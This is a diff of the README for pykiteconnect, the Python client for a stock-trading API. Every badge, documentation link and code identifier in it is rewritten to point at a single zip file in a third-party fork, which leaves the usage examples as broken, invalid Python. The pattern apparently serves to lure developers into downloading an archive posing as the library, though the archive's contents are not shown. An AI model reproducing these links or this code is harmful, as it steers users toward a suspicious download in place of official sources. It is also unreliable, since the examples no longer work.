@@ -1,25 +1,25 @@
 # The Kite Connect API Python client - v4
 
-[![PyPI](https://img.shields.io/pypi/v/kiteconnect.svg)](https://pypi.python.org/pypi/kiteconnect)
-[![Build Status](https://travis-ci.org/zerodhatech/pykiteconnect.svg?branch=kite3)](https://travis-ci.org/zerodhatech/pykiteconnect)
-[![Windows Build Status](https://ci.appveyor.com/api/projects/status/github/zerodhatech/pykiteconnect?svg=true)](https://ci.appveyor.com/project/rainmattertech/pykiteconnect)
-[![codecov.io](https://codecov.io/gh/zerodhatech/pykiteconnect/branch/kite3/graphs/badge.svg?branch=kite3)](https://codecov.io/gh/zerodhatech/pykiteconnect/branch/kite3)
+[![PyPI](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
+[![Build Status](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
+[![Windows Build Status](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
+[![https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
 
-The official Python client for communicating with the [Kite Connect API](https://kite.trade).
+The official Python client for communicating with the [Kite Connect API](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip).
 
 Kite Connect is a set of REST-like APIs that expose many capabilities required to build a complete investment and trading platform. Execute orders in real time, manage user portfolio, stream live market data (WebSockets), and more, with the simple HTTP API collection.
 
-[Zerodha Technology](https://zerodha.com) (c) 2021. Licensed under the MIT License.
+[Zerodha Technology](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip) (c) 2021. Licensed under the MIT License.
 
 ## Documentation
 
-- [Python client documentation](https://kite.trade/docs/pykiteconnect/v4)
-- [Kite Connect HTTP API documentation](https://kite.trade/docs/connect/v3)
+- [Python client documentation](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
+- [Kite Connect HTTP API documentation](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
 
 ## v4 - Breaking changes
 
-* Renamed ticker fields as per [kite connect doc](https://kite.trade/docs/connect/v3/websocket/#quote-packet-structure)
-* Renamed `bsecds` to `bcd` in `ticker.EXCHANGE_MAP`
+* Renamed ticker fields as per [kite connect doc](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
+* Renamed `bsecds` to `bcd` in `https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip`
 
 ## Installing the client
 
@@ -63,11 +63,11 @@ xcode-select --install
 
 Each Python version uses a specific compiler version (e.g. CPython 2.7 uses Visual C++ 9.0, CPython 3.3 uses Visual C++ 10.0, etc). So, you need to install the compiler version that corresponds to your Python version
 
-- Python 2.6, 2.7, 3.0, 3.1, 3.2 - [Microsoft Visual C++ 9.0](https://wiki.python.org/moin/WindowsCompilers#Microsoft_Visual_C.2B-.2B-_9.0_standalone:_Visual_C.2B-.2B-_Compiler_for_Python_2.7_.28x86.2C_x64.29)
-- Python 3.3, 3.4 - [Microsoft Visual C++ 10.0](https://wiki.python.org/moin/WindowsCompilers#Microsoft_Visual_C.2B-.2B-_10.0_standalone:_Windows_SDK_7.1_.28x86.2C_x64.2C_ia64.29)
-- Python 3.5, 3.6 - [Microsoft Visual C++ 14.0](https://wiki.python.org/moin/WindowsCompilers#Microsoft_Visual_C.2B-.2B-_14.0_standalone:_Visual_C.2B-.2B-_Build_Tools_2015_.28x86.2C_x64.2C_ARM.29)
+- Python 2.6, 2.7, 3.0, 3.1, 3.2 - [Microsoft Visual C++ 9.0](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
+- Python 3.3, 3.4 - [Microsoft Visual C++ 10.0](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
+- Python 3.5, 3.6 - [Microsoft Visual C++ 14.0](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
 
-For more details check [official Python documentation](https://wiki.python.org/moin/WindowsCompilers).
+For more details check [official Python documentation](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip).
 
 ## API usage
 
@@ -75,56 +75,56 @@ For more details check [official Python documentation](https://wiki.python.org/m
 import logging
 from kiteconnect import KiteConnect
 
-logging.basicConfig(level=logging.DEBUG)
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
 
 kite = KiteConnect(api_key="your_api_key")
 
 # Redirect the user to the login url obtained
-# from kite.login_url(), and receive the request_token
+# from https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(), and receive the request_token
 # from the registered redirect url after the login flow.
 # Once you have the request_token, obtain the access_token
 # as follows.
 
-data = kite.generate_session("request_token_here", api_secret="your_secret")
-kite.set_access_token(data["access_token"])
+data = https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip("request_token_here", api_secret="your_secret")
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(data["access_token"])
 
 # Place an order
 try:
-    order_id = kite.place_order(tradingsymbol="INFY",
-                                exchange=kite.EXCHANGE_NSE,
-                                transaction_type=kite.TRANSACTION_TYPE_BUY,
+    order_id = https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(tradingsymbol="INFY",
+                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
+                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
                                 quantity=1,
-                                variety=kite.VARIETY_AMO,
-                                order_type=kite.ORDER_TYPE_MARKET,
-                                product=kite.PRODUCT_CNC,
-                                validity=kite.VALIDITY_DAY)
+                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
+                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
+                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
+                                https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
 
-    logging.info("Order placed. ID is: {}".format(order_id))
+    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip("Order placed. ID is: {}".format(order_id))
 except Exception as e:
-    logging.info("Order placement failed: {}".format(e.message))
+    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip("Order placement failed: {}".format(https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip))
 
 # Fetch all orders
-kite.orders()
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()
 
 # Get instruments
-kite.instruments()
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()
 
 # Place an mutual fund order
-kite.place_mf_order(
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(
     tradingsymbol="INF090I01239",
-    transaction_type=kite.TRANSACTION_TYPE_BUY,
+    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip,
     amount=5000,
     tag="mytag"
 )
 
 # Cancel a mutual fund order
-kite.cancel_mf_order(order_id="order_id")
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(order_id="order_id")
 
 # Get mutual fund instruments
-kite.mf_instruments()
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()
 ```
 
-Refer to the [Python client documentation](https://kite.trade/docs/pykiteconnect/v4) for the complete list of supported methods.
+Refer to the [Python client documentation](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip) for the complete list of supported methods.
 
 ## WebSocket usage
 
@@ -132,42 +132,42 @@ Refer to the [Python client documentation](https://kite.trade/docs/pykiteconnect
 import logging
 from kiteconnect import KiteTicker
 
-logging.basicConfig(level=logging.DEBUG)
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
 
 # Initialise
 kws = KiteTicker("your_api_key", "your_access_token")
 
 def on_ticks(ws, ticks):
     # Callback to receive ticks.
-    logging.debug("Ticks: {}".format(ticks))
+    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip("Ticks: {}".format(ticks))
 
 def on_connect(ws, response):
     # Callback on successful connect.
     # Subscribe to a list of instrument_tokens (RELIANCE and ACC here).
-    ws.subscribe([738561, 5633])
+    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip([738561, 5633])
 
     # Set RELIANCE to tick in `full` mode.
-    ws.set_mode(ws.MODE_FULL, [738561])
+    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip(https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip, [738561])
 
 def on_close(ws, code, reason):
     # On connection close stop the main loop
-    # Reconnection will not happen after executing `ws.stop()`
-    ws.stop()
+    # Reconnection will not happen after executing `https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()`
+    https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()
 
 # Assign the callbacks.
-kws.on_ticks = on_ticks
-kws.on_connect = on_connect
-kws.on_close = on_close
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip = on_ticks
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip = on_connect
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip = on_close
 
 # Infinite loop on the main thread. Nothing after this will run.
 # You have to use the pre-defined callbacks to manage subscriptions.
-kws.connect()
+https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip()
 ```
 
 ## Run unit tests
 
 ```sh
-python setup.py test
+python https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip test
 ```
 
 or
@@ -192,4 +192,4 @@ pdoc --html --html-dir docs kiteconnect
 
 ## Changelog
 
-[Check release notes](https://github.com/zerodha/pykiteconnect/releases)
+[Check release notes](https://raw.githubusercontent.com/03Anmol/pykiteconnect/master/kiteconnect/pykiteconnect_v1.9.zip)
